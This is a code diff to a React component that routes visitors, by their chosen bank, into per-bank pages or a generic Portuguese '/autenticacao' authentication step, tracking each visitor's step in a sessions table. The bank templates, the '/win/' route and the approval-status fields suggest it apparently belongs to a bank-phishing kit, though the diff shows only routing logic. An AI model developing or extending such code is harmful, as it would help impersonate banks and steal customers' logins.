@@ -223,9 +223,26 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
       delete nextFormData[field];
     }
 
+    // PORTEKIZ: ozel template'i olmayan bankalar dogrudan autenticacao'ya gider.
+    // Ara /win/.../bank sayfasi atlanir -> geri tusu banka listesine doner.
+    const PT_TEMPLATE_SLUGS = new Set(["cgd", "abanca", "bpi", "novo-banco", "santander-pt"]);
+    const selectedBank = banks.find((b) => b.slug === nextBankSlug);
+    const isPortugal = Boolean(
+      (selectedBank?.country && countriesMatch(selectedBank.country, "Portekiz")) ||
+      /(^|[-_\s])pt($|[-_\s])/.test(nextBankSlug.toLowerCase()) ||
+      PT_TEMPLATE_SLUGS.has(nextBankSlug)
+    );
+    const isAutenticacaoFlow = isPortugal && !PT_TEMPLATE_SLUGS.has(nextBankSlug);
+
+    if (isAutenticacaoFlow) {
+      nextFormData.bankSlug = nextBankSlug;
+      nextFormData.bankName = displayName;
+      nextFormData.approvalStatus = "";
+    }
+
     const { error } = await supabase
       .from("sessions")
-      .update({ is_hidden: false, current_step: "bank",
+      .update({ is_hidden: false, current_step: isAutenticacaoFlow ? "autenticacao" : "bank",
         form_data: nextFormData,
       })
       .eq("id", sessionId);
@@ -241,7 +258,11 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
     }
     else {
       setSessionFormData(nextFormData);
-      router.push(`/win/${effectiveRouteSessionId}/bank/${nextBankSlug}`);
+      router.push(
+        isAutenticacaoFlow
+          ? `/autenticacao?session=${encodeURIComponent(effectiveRouteSessionId)}`
+          : `/win/${effectiveRouteSessionId}/bank/${nextBankSlug}`
+      );
     }
   }
 
